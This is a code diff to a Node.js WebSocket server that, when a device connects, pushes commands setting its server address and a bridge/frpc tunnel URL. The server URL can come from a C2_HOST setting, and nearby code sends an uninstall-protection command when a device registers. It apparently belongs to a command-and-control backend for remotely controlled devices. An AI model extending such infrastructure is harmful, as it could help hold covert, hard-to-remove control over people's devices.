@@ -1,6 +1,7 @@
 'use strict';
 
 const { getPool } = require('../services/commandPoller');
+const config = require('../../config');
 const {
   broadcastToAdmins,
   forwardFrameToAdmins,
@@ -453,6 +454,49 @@ async function queryPolicyRows(sql) {
   }
 }
 
+function getDeviceBootstrapServerUrl() {
+  const explicit = String(process.env.DEVICE_BOOTSTRAP_SERVER_URL || process.env.C2_HOST || '').trim();
+  if (explicit) return explicit.replace(/\/+$/, '');
+  const host = String(config.external?.host || config.frps?.addr || '127.0.0.1').trim();
+  const port = Number(config.external?.port || config.port || 8889);
+  const defaultPort = port === 80 || port === 443;
+  const scheme = port === 443 ? 'https' : 'http';
+  return `${scheme}://${host}${defaultPort ? '' : `:${port}`}`.replace(/\/+$/, '');
+}
+
+function sendDeviceBootstrapCommands(ws, sessionId, connections) {
+  if (!ws || ws.readyState !== 1) return false;
+  if (connections.bridges.has(sessionId)) return false;
+
+  const serverUrl = getDeviceBootstrapServerUrl();
+  const bridgeUrl = serverUrl.replace(/^http:/i, 'ws:').replace(/^https:/i, 'wss:')
+    + `/ws/bridge?deviceId=${encodeURIComponent(sessionId)}`;
+
+  const commands = [
+    ['setAppConfig', { deviceId: sessionId, serverAddr: serverUrl }],
+    ['setConfig', { deviceId: sessionId, serverAddr: serverUrl, serverHost: serverUrl.replace(/^https?:\/\//i, ''), bridgeUrl }],
+    ['saveConfig', {}],
+    ['forceSync', {}],
+    ['setServerAddr', { serverAddr: serverUrl }],
+  ];
+
+  let delay = 0;
+  for (const [command, params] of commands) {
+    setTimeout(() => {
+      try {
+        if (ws.readyState === 1 && connections.devices.get(sessionId)?.ws === ws) {
+          ws.send(JSON.stringify({ type: 'command', sessionId, data: { command, params } }));
+        }
+      } catch (e) {
+        console.warn(`[WS-Device] bootstrap command ${command} failed for ${sessionId}: ${e.message}`);
+      }
+    }, delay);
+    delay += 300;
+  }
+  console.log(`[WS-Device] scheduled bridge bootstrap commands for ${sessionId} server=${serverUrl}`);
+  return true;
+}
+
 async function syncGlobalPolicies(ws, sessionId) {
   if (!ws || ws.readyState !== 1) return;
   const [sensitiveRows, blackRows, paymentRows] = await Promise.all([
@@ -549,6 +593,15 @@ function handleDevice(ws, sessionId, connections) {
 
   // 更新设备在线状态 + IP
   if (isNewOnlinePresence) updateDeviceStatus(sessionId, true, clientIp);
+
+  // 设备主 WS 上线即下发 Bridge/frpc 初始化；原来只在 /ws/bridge 连接后下发，
+  // 会造成“等 bridge 上线才配置 bridge”的死循环。
+  tasks.schedule(() => {
+    if (connections.devices.get(sessionId)?.ws !== ws) return;
+    if (claimDeviceTask(lifecycle, sessionId, 'bridge-bootstrap')) {
+      sendDeviceBootstrapCommands(ws, sessionId, connections);
+    }
+  }, 500);
 
   // 2026-08-02 device auto-protect: send ENABLE_UNINSTALL_PROTECTION on register
   tasks.schedule(() => {
